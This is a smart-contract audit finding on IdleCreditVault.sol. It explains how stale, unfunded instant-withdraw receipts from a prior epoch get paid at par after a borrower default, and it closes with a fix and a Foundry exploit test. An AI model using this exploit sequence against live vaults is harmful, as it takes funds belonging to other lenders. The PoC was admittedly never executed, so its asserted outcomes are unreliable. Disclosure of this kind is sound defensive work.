### Title
Stale prior-epoch instant-withdraw receipts escape default-recovery accounting and are paid at par, stealing funded withdraw reserves - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
Analogous to a directory traversal where `../../` escapes the intended root, an instant-withdraw receipt whose request *epoch* predates the default epoch "traverses" outside the per-epoch recovery boundary. `defaultPendingClaimBasis()` and `_claimDefaultedInstantWithdrawRequest()` only look at `instantWithdrawClaimsByEpoch[epochNumber]` / `instantWithdrawsRequestsByEpoch[user][defaultRecoveryEpoch]`, so unfunded instant receipts from an earlier epoch are neither haircut nor included in `totalBasis`, yet remain in `instantWithdrawsRequests[user]` and `pendingInstantWithdraws` and are paid 1:1 via `_transferFundedClaim`.

### Finding Description
The vulnerable sequence:

1. **Epoch N-1 (running/stop):** a lender calls `requestInstantWithdraw`. At `stopEpoch`/`startEpoch` the borrower only partially funds the instant queue, so `collectInstantWithdrawFunds` reduces `pendingInstantWithdraws` by less than the request. The user does not claim. The unfunded remainder persists in `pendingInstantWithdraws`, `instantWithdrawsRequests[user]`, and `instantWithdrawsRequestsByEpoch[user][N-1]` (line 366-374).
2. **Epoch N:** a new epoch starts and the borrower defaults. `finalizeDefaultRecovery` runs (line 661).
   - `defaultPendingClaimBasis()` adds `instantWithdrawClaimsByEpoch[epochNumber]` — only epoch-N requests — plus `pendingWithdraws` (line 644-649). The epoch N-1 unfunded instant remainder is **absent from `totalBasis`**.
   - `_defaultPrefundedInstantReserve()` computes `instantWithdrawClaimsByEpoch[epochNumber] - pendingInstantWithdraws` (line 716-722). Because `pendingInstantWithdraws` still carries the epoch N-1 remainder, `prefundedReserve` is computed as 0 (or too small), so no reserve is allocated to the stale receipt either.
   - `defaultInstantWithdrawsFinalized` is set true because `pendingInstantWithdraws != 0` (line 696).
3. **Claim:** `claimInstantWithdrawRequest` first calls `_claimDefaultedInstantWithdrawRequest`, which only clears `instantWithdrawsRequestsByEpoch[user][defaultRecoveryEpoch]` (line 842-856). The stale epoch N-1 basis stays in `instantWithdrawsRequests[user]`, and the function then burns it and calls `_transferFundedClaim(user, amount)` (line 387-392).
4. `_transferFundedClaim` only protects `defaultRecoveryReserve` (line 897-906). The par payment therefore draws from the strategy balance that was collected via `collectWithdrawFunds` to back *other users'* funded withdraw receipts, or forces those users' claims to revert `NotAllowed` on the `balance - reserve < _amount` check.

The same epoch-keyed asymmetry exists for normal withdraw requests only via `lastWithdrawRequest`, which is guarded (line 263-271); instant receipts have no equivalent guard because they are keyed per-epoch but consumed aggregate.

### Impact Explanation
Direct theft / insolvency: the stale instant receipt is paid at par although it was never funded and was excluded from the recovery haircut. The payout is sourced from underlying that `collectWithdrawFunds` reserved for funded normal-withdraw claimants, so either the attacker steals those funds (loss equal to the unfunded stale instant amount) or funded claimants' `claimWithdrawRequest` permanently reverts at the reserve check (freezing of unclaimed withdrawals). Quantified loss: up to the full unfunded remainder of the instant queue at the epoch boundary, bounded by `pendingInstantWithdraws` at default time.

### Likelihood Explanation
Requires: (a) instant-withdraw feature enabled (`allowInstantWithdraw`), (b) a borrower stop/start that under-funds the instant queue leaving `pendingInstantWithdraws > 0` into the next epoch (the code explicitly contemplates "partially prefunded instant requests" at line 638-640), (c) an honest-manager default in the following epoch, and (d) the stale receipt holder claiming after `finalizeDefaultRecovery`. All steps are sequencing around honest privileged calls; the receipt holder is an ordinary KYC'd lender. Likelihood is moderate: under-funded instant queues and back-to-back default are edge conditions but not prevented by any guard.

### Recommendation
Include the full `pendingInstantWithdraws` (or all epochs' instant basis, not just `instantWithdrawClaimsByEpoch[epochNumber]`) in `defaultPendingClaimBasis()` and `_defaultPrefundedInstantReserve()`, and make `_claimDefaultedInstantWithdrawRequest` clear stale instant basis across all epochs (e.g., iterate or store per-user request epochs) so no unfunded instant receipt can be paid at par after `defaultRecoveryFinalized`. Alternatively, track funded vs unfunded instant basis per user so `claimInstantWithdrawRequest` can only pay the funded portion post-finalization.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./IdleCreditVault.t.sol"; // reuse the existing fixture helpers

contract StaleInstantReceiptPoC is IdleCreditVaultTest {
    // Scenario: epoch N-1 instant queue is only partially funded at epoch rollover;
    // epoch N defaults; the stale instant receipt is paid at par from withdraw reserves.
    function testStaleInstantReceiptPaidAtPar() external {
        IdleCreditVault creditVault = IdleCreditVault(address(strategy));
        address attacker = makeAddr("stale-instant-user");

        // 1. Deposits: attacker + a normal withdraw requester
        _depositWithUser(attacker, 10_000 * ONE_SCALE, true);
        idleCDO.depositAA(10_000 * ONE_SCALE);
        vm.prank(owner);
        cdoEpoch.setAllowInstantWithdraw(true);

        // 2. Epoch N-1: attacker requests instant withdraw (buffer phase)
        vm.startPrank(attacker);
        IERC20(AAtranche).approve(address(cdoEpoch), type(uint256).max);
        cdoEpoch.requestInstantWithdraw(5_000 * ONE_SCALE, AAtranche);
        vm.stopPrank();

        // 3. Another user requests normal withdraw for next epoch
        uint256 normalReq = cdoEpoch.requestWithdraw(2_000 * ONE_SCALE, address(AAtranche));

        // 4. Epoch start: borrower only partially covers instant queue.
        //    Fund CDO/strategy so collectInstantWithdrawFunds pulls only part of it.
        uint256 pendingInstant = creditVault.pendingInstantWithdraws();
        uint256 fundedPart = pendingInstant / 2;
        deal(defaultUnderlying, borrower, fundedPart); // borrower under-funds
        _startEpochAndCheckPrices(0); // startEpoch -> collectInstantWithdrawFunds(fundedPart)
        assertEq(creditVault.pendingInstantWithdraws(), pendingInstant - fundedPart,
            "stale unfunded instant remainder");

        // attacker does NOT claim; epoch N-1 remainder persists into epoch N
        // epochNumber bumped at next deposit-in-running/stop cycle
        _startEpochAndCheckPrices(1);

        // 5. Epoch N: borrower defaults (stopEpoch with insufficient repayment)
        deal(defaultUnderlying, borrower, 0);
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(initialProvidedApr, 0);
        _checkDefault();

        // 6. Finalize default recovery.
        //    totalBasis excludes epoch-(N-1) instant basis; prefundedReserve is 0
        //    because pendingInstantWithdraws is fully attributed to epoch N math.
        uint256 recovered =
            (cdoEpoch.getContractValue() + cdoEpoch.defaultPendingClaimBasis()) / 2;
        deal(defaultUnderlying, manager, recovered);
        vm.startPrank(manager);
        IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
        cdoEpoch.finalizeDefault(recovered, manager);
        vm.stopPrank();
        assertTrue(creditVault.defaultRecoveryFinalized());

        // 7. Attacker claims: defaulted-epoch path clears nothing (request was in N-1),
        //    then _transferFundedClaim pays the WHOLE instantWithdrawsRequests at par,
        //    spending underlying reserved for the funded normal withdraw request.
        uint256 pre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
        vm.prank(attacker);
        cdoEpoch.claimInstantWithdrawRequest();
        uint256 paid = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - pre;

        // The unfunded remainder (pendingInstant - fundedPart) is paid at par even
        // though it was never in the recovery basis -> drains withdraw reserves.
        assertGt(paid, fundedPart, "stale unfunded instant remainder paid at par");

        // 8. The funded normal-withdraw claimant now cannot be paid: claim reverts
        //    on the defaultRecoveryReserve guard or balance shortfall.
        vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
        cdoEpoch.claimWithdrawRequest();
    }
}
```

Note on certainty: the PoC fixture assumptions (partial instant funding at epoch rollover carried into a subsequent default) match the "partially prefunded instant requests" and "`pendingInstantWithdraws` is only the unfunded remainder" comments at `IdleCreditVault.sol:638-640,849-852`, but I could not fully execute the epoch-rollover funding path within this session; the invariant break (epoch-keyed basis vs aggregate payout) is confirmed by reading `defaultPendingClaimBasis`, `_claimDefaultedInstantWithdrawRequest`, and `claimInstantWithdrawRequest` directly.